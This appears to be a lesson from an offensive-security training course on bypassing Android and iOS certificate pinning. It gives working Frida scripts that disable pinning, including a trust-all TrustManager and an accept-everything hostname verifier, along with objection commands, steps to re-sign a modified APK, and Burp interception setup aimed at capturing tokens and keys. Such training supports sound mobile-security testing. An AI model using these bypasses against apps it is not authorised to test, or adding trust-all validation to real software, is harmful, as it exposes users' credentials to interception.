---
title: "Certificate Pinning Bypass — Frida, objection, Network Security Config, Custom TrustManager"
tags: [android, ios, certificate-pinning, TLS, frida, objection, MitM, Burp-Suite,
       trust-manager, MASVS-NETWORK-2, SSL-kill-switch]
module: 04-BroadSurface-03
day: 215
related_topics:
  - TLS and TLS Attacks (Days 5–6)
  - Android Dynamic Analysis with Frida (Day 214)
  - Mobile API Attack Surface (Day 219)
  - Mobile Detection and Hardening (Day 222)
---

# Day 215 — Certificate Pinning Bypass

> "Certificate pinning is the velvet rope outside the club. It looks serious.
> Most bouncers are half-asleep. Frida is the side door that was always unlocked.
> Once you know how pinning is implemented — Java trust manager, OkHttp pinner,
> native libssl — bypassing it is a ten-minute job. The apps that stop you cold
> are the ones using custom native implementations. Those are rare, and they are
> also the ones hiding the most interesting secrets."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Explain exactly how TLS certificate pinning works at the Android/iOS library
   level and why it stops a standard MitM proxy.
2. Intercept HTTPS traffic using Burp Suite through an Android device proxy.
3. Bypass certificate pinning using three methods: Network Security Config
   modification, Frida custom scripts, and objection one-liner.
4. Identify which pinning implementation an app uses by reading decompiled code.
5. Handle advanced pinning scenarios: OkHttp `CertificatePinner`, custom
   `TrustManager`, and native pinning in `.so` files.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| TLS handshake and certificate chains | Days 5–6, Day 33 |
| Burp Suite setup and proxy usage | Days 22–24 |
| Frida basics | Day 214 |
| Android Static Analysis | Day 212 |

---

## Part 1 — Why Certificate Pinning Exists and How It Breaks Burp

### 1.1 — Normal HTTPS Without Pinning

```
Client (Android app)
  ↓  connects to api.example.com:443
  ↓  server presents certificate signed by DigiCert (trusted root CA)
  ↓  Android OS verifies: DigiCert is in the system trust store
  ↓  TLS session established — encrypted traffic flows

Burp Suite MitM:
  ↓  Burp presents its own certificate (signed by Burp's CA)
  ↓  Android installs Burp CA as a USER certificate
  ↓  IF app trusts user CAs → Burp intercepts successfully
  ↓  IF app trusts only SYSTEM CAs → Burp CA rejected → connection fails
```

Without certificate pinning, installing Burp's CA as a user certificate is
enough to intercept (Android ≤ API 23 trusted user CAs by default; API 24+
apps only trust system CAs by default unless `networkSecurityConfig` allows it).

### 1.2 — With Certificate Pinning

The app goes one step further: beyond verifying that the certificate is from a
trusted CA, it also verifies that the certificate (or its public key, or its
SPKI hash) matches a **known-good value hardcoded into the app**.

```
Certificate Pinning Check:
  1. TLS handshake completes (cert chain valid)
  2. App extracts the leaf cert (or public key, or SPKI hash)
  3. App compares against its hardcoded pin list
  4. If NO MATCH → throw SSLPeerUnverifiedException → connection refused

Burp's certificate:
  - Signed by Burp CA (so TLS chain is valid once Burp CA is installed)
  - But the public key DOES NOT match api.example.com's pinned public key
  - → Pinning check fails → you see a "connection refused" in Burp
```

---

## Part 2 — Identifying the Pinning Implementation

Before bypassing, identify which library is responsible for pinning.
Search the decompiled source:

```bash
cd jadx_output/

# OkHttp CertificatePinner (most common)
rg -l "CertificatePinner" --type java

# TrustManager custom implementation
rg -l "TrustManager\|X509TrustManager\|checkServerTrusted" --type java

# HttpsURLConnection
rg -l "HttpsURLConnection\|setDefaultSSLSocketFactory" --type java

# SSL-specific
rg -l "SSLContext\|SSLSocketFactory\|TrustManagerFactory" --type java

# Android native Network Security Config
cat decoded/res/xml/network_security_config.xml 2>/dev/null

# Check for native library with SSL
find decoded/lib/ -name "*.so" | xargs -I{} sh -c 'strings {} | grep -li ssl 2>/dev/null && echo {}'
```

**Common patterns:**

| Implementation | Identifier in code |
|---|---|
| OkHttp `CertificatePinner` | `CertificatePinner.Builder().add("hostname", "sha256/...")` |
| Custom `X509TrustManager` | Class implementing `X509TrustManager`; `checkServerTrusted` method |
| `HttpsURLConnection` | `setSSLSocketFactory` + custom `SSLContext` |
| Conscrypt / network-security-config | `<pin-set>` in `res/xml/network_security_config.xml` |
| Network Security Config (Android) | `android:networkSecurityConfig` in manifest |
| Native pinning | No Java-level pinning; SSL logic in `libssl.so` / `libc.so` |
| iOS TrustKit | `TrustKit.framework` or `TSKPinningValidator` |

---

## Part 3 — Bypass Method 1: Network Security Config Modification

This method works when:
- The pinning is defined in `res/xml/network_security_config.xml`
- You can repackage and sign the APK

```bash
# Step 1: Decode the APK
apktool d target.apk -o decoded/

# Step 2: Locate and edit the network security config
cat decoded/res/xml/network_security_config.xml
```

Original (with pinning):

```xml
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <pin digest="SHA-256">abc123...base64...</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

Modified (pins removed, user CAs trusted):

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
</network-security-config>
```

```bash
# Step 3: Repack the APK
apktool b decoded/ -o modified.apk

# Step 4: Generate a signing key (one-time setup)
keytool -genkey -v -keystore ghost.keystore -alias ghost \
        -keyalg RSA -keysize 2048 -validity 10000

# Step 5: Sign the modified APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
          -keystore ghost.keystore modified.apk ghost

# Step 6: Zipalign (optional but recommended)
zipalign -v 4 modified.apk aligned.apk

# Step 7: Install on device
adb install -r aligned.apk
```

**Limitation:** some apps implement root-of-trust checks on the signing
certificate and will refuse to run if re-signed with a different key.

---

## Part 4 — Bypass Method 2: Frida Universal Pinning Bypass

Frida hooks the pinning check functions at runtime — no repackaging required.
Works on rooted devices.

### 4.1 — Universal SSL Bypass Script (covers most implementations)

```javascript
// ssl_bypass.js
// Disables SSL pinning across common Android implementations

Java.perform(function () {

    // --- OkHttp 3 CertificatePinner ---
    try {
        var CertPinner = Java.use("okhttp3.CertificatePinner");
        CertPinner.check.overload("java.lang.String", "java.util.List")
            .implementation = function (hostname, certs) {
                console.log("[+] OkHttp CertificatePinner.check bypassed for: " + hostname);
                // Return without checking — pinning disabled
            };
        console.log("[*] OkHttp3 CertificatePinner hooked");
    } catch (e) {
        console.log("[-] OkHttp3 not found: " + e);
    }

    // --- TrustManagerImpl (Android default) ---
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function (
            untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData
        ) {
            console.log("[+] TrustManagerImpl.verifyChain bypassed for: " + host);
            return untrustedChain;
        };
        console.log("[*] TrustManagerImpl hooked");
    } catch (e) {
        console.log("[-] TrustManagerImpl not found: " + e);
    }

    // --- Custom X509TrustManager (catch-all) ---
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var SSLContext = Java.use("javax.net.ssl.SSLContext");

        // Create a TrustManager that trusts everything
        var TrustManagerClass = Java.registerClass({
            name: "com.ghost.TrustAll",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function (chain, authType) {},
                checkServerTrusted: function (chain, authType) {},
                getAcceptedIssuers: function () { return []; }
            }
        });

        var TrustManagers = [TrustManagerClass.$new()];
        var TrustManagersArray = Java.array("javax.net.ssl.TrustManager", TrustManagers);

        var sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, TrustManagersArray, null);

        SSLContext.getDefault.implementation = function () {
            return sslContext;
        };

        console.log("[*] Custom TrustManager (trust-all) installed");
    } catch (e) {
        console.log("[-] TrustManager override failed: " + e);
    }

    // --- HostnameVerifier override ---
    try {
        var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function (verifier) {
            // Install a verifier that accepts all hostnames
            var TrustAllVerifier = Java.registerClass({
                name: "com.ghost.TrustAllVerifier",
                implements: [Java.use("javax.net.ssl.HostnameVerifier")],
                methods: {
                    verify: function (hostname, session) { return true; }
                }
            });
            this.setDefaultHostnameVerifier(TrustAllVerifier.$new());
            console.log("[+] HostnameVerifier overridden to trust all");
        };
    } catch (e) {
        console.log("[-] HostnameVerifier override failed: " + e);
    }
});
```

```bash
# Run with spawn to hook before any security code runs
frida -U -f com.target.app -l ssl_bypass.js --no-pause
```

### 4.2 — Frida SSL Pinning Bypass Repos

Pre-built scripts maintained by the community:

```bash
# frida-multiple-unpinning (covers 10+ pinning implementations)
# https://github.com/httptoolkit/frida-android-unpinning
wget https://raw.githubusercontent.com/httptoolkit/frida-android-unpinning/main/frida-script.js
frida -U -f com.target.app -l frida-script.js --no-pause
```

---

## Part 5 — Bypass Method 3: objection One-Liner

`objection` wraps the Frida bypass into a single command:

```bash
# Attach and immediately bypass SSL pinning
objection -g com.target.app explore --startup-command \
    "android sslpinning disable"

# Or interactively after attaching:
objection -g com.target.app explore
# (inside REPL)
android sslpinning disable
```

This covers OkHttp, TrustManager, and several other implementations
automatically. It is the fastest method for testing — if it works, move on;
if it doesn't, you need a custom Frida script targeting the specific
implementation.

---

## Part 6 — iOS Certificate Pinning Bypass

For iOS, the approach is similar but requires a jailbroken device.

### 6.1 — SSL Kill Switch 2 (Cydia/Sileo Tweak)

```
1. On jailbroken device, open Cydia or Sileo
2. Add repo: https://julioverne.github.io/
3. Install "SSL Kill Switch 2"
4. Enable via Settings → SSL Kill Switch → "Disable Certificate Validation"
5. Re-launch the target app
```

This patches `SecTrustEvaluate` at the system level — affects all apps.

### 6.2 — iOS Frida Bypass

```javascript
// ios_ssl_bypass.js
// Hooks iOS SecTrustEvaluate (used by URLSession, Alamofire, etc.)

var SecTrustEvaluate = ObjC.classes.NSURLCredential;

// Intercept SecTrustEvaluateWithError
Interceptor.replace(
    Module.findExportByName("Security", "SecTrustEvaluateWithError"),
    new NativeCallback(function (trust, errorPtr) {
        console.log("[+] SecTrustEvaluateWithError bypassed");
        if (!errorPtr.isNull()) {
            Memory.writePointer(errorPtr, NULL);
        }
        return 1;  // kSecTrustResultUnspecified — success
    }, "int", ["pointer", "pointer"])
);
```

---

## Part 7 — Proxy Configuration

Once pinning is bypassed, configure Burp to intercept traffic:

```bash
# Step 1: Set device proxy to Burp listener
# On Android device: Settings → Wi-Fi → Long press network → Modify Network
# → Proxy → Manual
# Hostname: <your machine IP>
# Port: 8080

# Step 2: In Burp Suite: Proxy → Options → Add listener 0.0.0.0:8080
# Ensure "Support invisible proxying" is enabled for non-proxy-aware traffic

# Step 3: Install Burp CA
# In Burp: Proxy → Options → Import / export CA certificate → DER format
adb push burp.der /sdcard/burp.der
# On device: Settings → Security → Install certificate → burp.der

# Step 4: With pinning bypassed, trigger app traffic
# Watch Burp Proxy → HTTP History for intercepted requests
```

---

## Key Takeaways

1. **Certificate pinning is a software control — it can be hooked.** Every
   pinning implementation ultimately calls a function. Frida hooks that function
   and returns "success" regardless of the actual certificate. The chain is only
   as strong as its first hookable function.
2. **Identify the implementation before choosing the bypass.** OkHttp's
   `CertificatePinner` requires a different hook than a custom `TrustManager`.
   Reading 20 lines of decompiled code saves 30 minutes of failed bypass attempts.
3. **objection is your first attempt, always.** It covers 80% of apps in one
   command. Custom Frida scripts are for the other 20%.
4. **Native pinning (libssl.so) is the hard case.** When pinning is implemented
   in a native library, you need `Interceptor.attach` on a native export — harder
   but not impossible.
5. **Once pinning is bypassed, every request is visible.** JWT tokens,
   session cookies, API keys in headers, internal endpoint URLs — all captured
   in Burp's proxy history.

---

## Exercises

1. Set up a Burp proxy for your Android emulator. Without any bypass, attempt
   to intercept traffic from an app that uses certificate pinning (e.g.
   OWASP Security Shepherd app, or configure a custom app with OkHttp
   `CertificatePinner`). Confirm you see a `javax.net.ssl.SSLPeerUnverifiedException`
   in the app logs.

2. Apply the `objection` one-liner bypass. Confirm in Burp that HTTPS traffic
   is now intercepted. Document which requests you captured and what auth
   tokens/headers you observe.

3. Write a Frida script that specifically hooks `OkHttpClient.CertificatePinner.check`
   and logs the hostname it is called with — then returns without throwing.
   Run it against a target app with OkHttp pinning.

4. Inspect the Network Security Config of any decompiled APK. Modify it to
   trust user CAs. Repackage and sign the APK with a test keystore. Install it
   and confirm Burp can now intercept without a Frida bypass.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q215.1, Q215.2 …).
> Follow-up questions use hierarchical numbering (Q215.1.1, Q215.1.2 …).

---

## Navigation

← Previous: [Day 214 — Android Dynamic Analysis with Frida](DAY-0214-Android-Dynamic-Analysis-Frida.md)
→ Next: [Day 216 — Android Insecure Storage](DAY-0216-Android-Insecure-Storage.md)
